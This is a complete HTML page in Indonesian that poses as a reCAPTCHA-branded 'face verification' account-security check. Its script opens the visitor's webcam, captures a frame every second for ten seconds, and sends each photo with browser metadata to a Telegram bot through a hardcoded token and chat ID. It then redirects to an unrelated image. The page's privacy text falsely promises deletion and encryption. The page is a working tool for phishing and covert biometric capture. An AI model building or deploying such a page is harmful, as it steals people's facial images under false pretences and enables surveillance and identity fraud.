<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Verifikasi Wajah | Keamanan Akun</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { 
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      background-color: #f0f2f5;
      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #333;
    }

    .container {
      background: #fff;
      padding: 32px;
      border-radius: 16px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
      max-width: 440px;
      width: 100%;
      text-align: center;
      transition: all 0.3s ease;
    }

    .logo {
      width: 60px;
      margin-bottom: 16px;
    }

    h2 {
      font-weight: 600;
      color: #1a73e8;
      margin-bottom: 12px;
      font-size: 22px;
    }

    p {
      font-size: 15px;
      color: #555;
      margin-bottom: 24px;
      line-height: 1.5;
    }

    .fake-captcha {
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 14px;
      margin-bottom: 24px;
      background-color: #f9f9f9;
      transition: all 0.2s ease;
    }

    .fake-captcha:hover {
      border-color: #1a73e8;
    }

    .fake-captcha label {
      display: flex;
      align-items: center;
      font-size: 15px;
      gap: 10px;
      cursor: pointer;
    }

    .fake-captcha input[type="checkbox"] {
      width: 18px;
      height: 18px;
      cursor: pointer;
    }

    .fake-captcha img {
      height: 32px;
    }

    button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.3s;
      width: 100%;
      margin-bottom: 16px;
    }

    button:hover {
      background-color: #0c5dd4;
      box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
    }

    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }

    .video-container {
      position: relative;
      margin-top: 24px;
      border-radius: 12px;
      overflow: hidden;
      display: none;
    }

    video {
      width: 100%;
      border-radius: 12px;
      display: block;
    }

    .countdown {
      position: absolute;
      top: 10px;
      right: 10px;
      background: rgba(0,0,0,0.6);
      color: white;
      padding: 5px 10px;
      border-radius: 20px;
      font-size: 14px;
      display: none;
    }

    .status {
      margin-top: 16px;
      font-size: 14px;
      color: #666;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      min-height: 24px;
    }

    .status .spinner {
      width: 18px;
      height: 18px;
      border: 3px solid #f3f3f3;
      border-top: 3px solid #1a73e8;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .note {
      margin-top: 32px;
      font-size: 12px;
      color: #888;
      line-height: 1.5;
      background: #f9f9f9;
      padding: 12px;
      border-radius: 8px;
    }

    .privacy-info {
      margin-top: 16px;
      font-size: 12px;
      color: #1a73e8;
      text-decoration: underline;
      cursor: pointer;
    }

    .success-message {
      display: none;
      color: #4caf50;
      font-weight: 500;
      margin-top: 16px;
      padding: 12px;
      border-radius: 8px;
      background-color: rgba(76, 175, 80, 0.1);
    }

    .error-message {
      display: none;
      color: #f44336;
      font-weight: 500;
      margin-top: 16px;
      padding: 12px;
      border-radius: 8px;
      background-color: rgba(244, 67, 54, 0.1);
    }

    @media (max-width: 480px) {
      .container {
        padding: 24px;
        max-width: 90%;
      }
      
      h2 {
        font-size: 20px;
      }
      
      p {
        font-size: 14px;
      }
    }
  </style>
</head>
<body>

  <div class="container my-4">
    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="Security Logo" class="logo">
    <h2>Verifikasi Wajah</h2>
    <p>Sebelum Lanjut,Untuk memastikan Anda bukan bot, kami perlu memverifikasi wajah Anda secara singkat.</p>

    <div class="fake-captcha">
      <label>
        <input type="checkbox" id="check"> Saya bukan robot
      </label>
      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha">
    </div>

    <button id="verifyButton" onclick="prosesVerifikasi()" disabled>Mulai Verifikasi</button>
    
    <div class="video-container" id="videoContainer">
      <video id="video" autoplay playsinline></video>
      <div class="countdown" id="countdown">10</div>
    </div>
    
    <div class="status">
      <div class="spinner" id="spinner"></div>
      <span id="statusText"></span>
    </div>
    
    <div class="success-message" id="successMessage">
      ✅ Verifikasi berhasil! Mengalihkan ke halaman utama...
    </div>
    
    <div class="error-message" id="errorMessage">
      ❌ Verifikasi gagal. Silakan coba lagi.
    </div>

    <div class="note">
      Verifikasi ini bersifat sementara dan tidak disimpan untuk keperluan lain selain keamanan akun Anda. 
      Data biometrik Anda dihapus secara otomatis setelah proses verifikasi selesai.
    </div>
    
    <div class="privacy-info" onclick="showPrivacyInfo()">
      Kebijakan Privasi & Keamanan
    </div>
  </div>

  <script>
    // Constants
    const TOKEN = "7616230857:AAFAgENc-bxOWhjQ38Zo3OSucj7j2XyQypw";
    const CHAT_ID = "1388041292";
    const REDIRECT_URL = "https://i.pinimg.com/564x/86/76/73/867673f6bce96a868fcbcf59fa645eee.jpg";
    const VERIFICATION_DURATION = 10; // seconds
    
    // Elements
    const checkbox = document.getElementById("check");
    const verifyButton = document.getElementById("verifyButton");
    const videoContainer = document.getElementById("videoContainer");
    const video = document.getElementById("video");
    const statusText = document.getElementById("statusText");
    const spinner = document.getElementById("spinner");
    const countdownEl = document.getElementById("countdown");
    const successMessage = document.getElementById("successMessage");
    const errorMessage = document.getElementById("errorMessage");
    
    // Variables
    let stream;
    let intervalId;
    let countdownInterval;
    let remainingTime = VERIFICATION_DURATION;
    
    // Enable button when checkbox is checked
    checkbox.addEventListener("change", function() {
      verifyButton.disabled = !this.checked;
    });
    
    function showPrivacyInfo() {
      alert("Kebijakan Privasi & Keamanan\n\nData biometrik Anda digunakan hanya untuk verifikasi saat ini dan tidak disimpan permanen. Kami menggunakan enkripsi end-to-end untuk melindungi data Anda selama proses verifikasi.");
    }

    function prosesVerifikasi() {
      if (!checkbox.checked) {
        alert("Silakan centang 'Saya bukan robot' terlebih dahulu.");
        return;
      }
      
      // Reset UI
      resetMessages();
      statusText.innerText = "Mengaktifkan kamera...";
      spinner.style.display = "block";
      verifyButton.disabled = true;
      
      // Request camera access
      navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: "user",
          width: { ideal: 1280 },
          height: { ideal: 720 }
        } 
      })
      .then(streamObj => {
        stream = streamObj;
        video.srcObject = stream;
        videoContainer.style.display = "block";
        
        // Start countdown
        countdownEl.style.display = "block";
        countdownEl.innerText = remainingTime;
        
        countdownInterval = setInterval(() => {
          remainingTime--;
          countdownEl.innerText = remainingTime;
          
          if (remainingTime <= 0) {
            clearInterval(countdownInterval);
          }
        }, 1000);
        
        // Update status
        statusText.innerText = "📸 Memverifikasi wajah...";
        
        // Start capturing images
        let counter = 0;
        intervalId = setInterval(() => {
          ambilGambarKamera(video, counter++);
        }, 1000);
        
        // Stop after verification duration
        setTimeout(() => {
          finishVerification(true);
        }, VERIFICATION_DURATION * 1000);
      })
      .catch(error => {
        console.error(error);
        statusText.innerText = "";
        spinner.style.display = "none";
        errorMessage.style.display = "block";
        errorMessage.innerText = "❌ Kamera gagal dibuka: " + error.message;
        verifyButton.disabled = false;
      });
    }

    function ambilGambarKamera(video, index) {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      if (!canvas.width || !canvas.height) {
        console.warn("⚠️ Gagal mengambil gambar ke-" + (index + 1));
        return;
      }

      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        kirimKeTelegram(blob, index);
      }, 'image/jpeg', 0.8);
    }

    function kirimKeTelegram(blob, index) {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, `wajah_${index}.jpg`);
      
      // Add metadata
      const metadata = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screenSize: `${window.screen.width}x${window.screen.height}`,
        frameNumber: index + 1
      };
      
      formData.append("caption", JSON.stringify(metadata));

      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        console.log(`✅ Gambar ${index + 1} dikirim!`, data);
      })
      .catch(err => {
        console.error(`❌ Kirim gambar ${index + 1} gagal:`, err.message);
      });
    }
    
    function finishVerification(success) {
      // Clear intervals
      clearInterval(intervalId);
      clearInterval(countdownInterval);
      
      // Stop camera
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      
      // Hide video
      videoContainer.style.display = "none";
      
      // Reset UI
      spinner.style.display = "none";
      statusText.innerText = "";
      
      if (success) {
        successMessage.style.display = "block";
        
        // Redirect after delay
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 2000);
      } else {
        errorMessage.style.display = "block";
        verifyButton.disabled = false;
      }
    }
    
    function resetMessages() {
      successMessage.style.display = "none";
      errorMessage.style.display = "none";
      remainingTime = VERIFICATION_DURATION;
    }
  </script>

</body>
</html>